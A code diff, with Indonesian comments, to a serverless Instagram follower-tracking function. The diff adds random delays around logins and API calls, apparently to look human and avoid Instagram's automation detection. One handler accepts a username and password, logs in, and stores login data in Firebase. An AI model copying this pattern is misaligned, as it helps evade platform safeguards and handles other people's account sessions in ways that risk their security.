@@ -13,6 +13,7 @@ const randomDelay = () => sleep(Math.floor(Math.random() * (5000 - 1000 + 1)) + 
 // Fungsi untuk login ke Instagram
 const login = async () => {
     ig.state.generateDevice(process.env.INSTAGRAM_USERNAME);
+    await randomDelay();  // Delay sebelum login
 
     if (sessionData) {
         ig.state.deserialize(sessionData);
@@ -35,6 +36,7 @@ const forceLogin = async () => {
     try {
         console.log('Mencoba login...');
         await ig.account.login(process.env.INSTAGRAM_USERNAME, process.env.INSTAGRAM_PASSWORD);
+        await randomDelay();  // Delay setelah login berhasil
         console.log('Login berhasil!');
         sessionData = ig.state.serialize();
         await db.ref('sessions').child(process.env.INSTAGRAM_USERNAME).set({ sessionData });
@@ -84,10 +86,13 @@ exports.handler = async function(event, context) {
         try {
             await login();
             const user = await ig.account.currentUser();
+            await randomDelay();  // Delay setelah login berhasil
 
             // Mendapatkan jumlah followers dan following
             const followersCount = await ig.user.info(user.pk).then(info => info.follower_count);
+            await randomDelay();  // Delay setelah mendapatkan followersCount
             const followingCount = await ig.user.info(user.pk).then(info => info.following_count);
+            await randomDelay();  // Delay setelah mendapatkan followingCount
 
             // Mendapatkan gambar profil
             const profilePicUrl = user.profile_pic_url;
@@ -97,6 +102,8 @@ exports.handler = async function(event, context) {
                 getAllFollowers(user.pk),
                 getAllFollowing(user.pk)
             ]);
+
+            await randomDelay();  // Delay setelah mendapatkan data followers dan following
 
             const followersUsernames = followers.map(f => f.username);
             const followingUsernames = following.map(f => f.username);
@@ -117,6 +124,7 @@ exports.handler = async function(event, context) {
                 profile_picture_url: profilePicUrl,
                 dont_follow_back_count: dontFollowBack.length,
             });
+            await randomDelay();  // Delay setelah menyimpan data ke Firebase
 
             return {
                 statusCode: 200,
@@ -151,9 +159,11 @@ exports.handler = async function(event, context) {
         try {
             ig.state.generateDevice(username);
             await ig.account.login(username, password);
+            await randomDelay();  // Delay setelah login berhasil
             sessionData = ig.state.serialize();
 
             const user = await ig.account.currentUser();
+            await randomDelay();  // Delay setelah mendapatkan user profile
             const userId = user.pk;
 
             const loginData = {
@@ -165,6 +175,8 @@ exports.handler = async function(event, context) {
             };
 
             await db.ref('logins').child(userId).set(loginData);
+            await randomDelay();  // Delay setelah menyimpan login data ke Firebase
+
             return {
                 statusCode: 200,
                 body: JSON.stringify({ message: 'Login berhasil!' }),
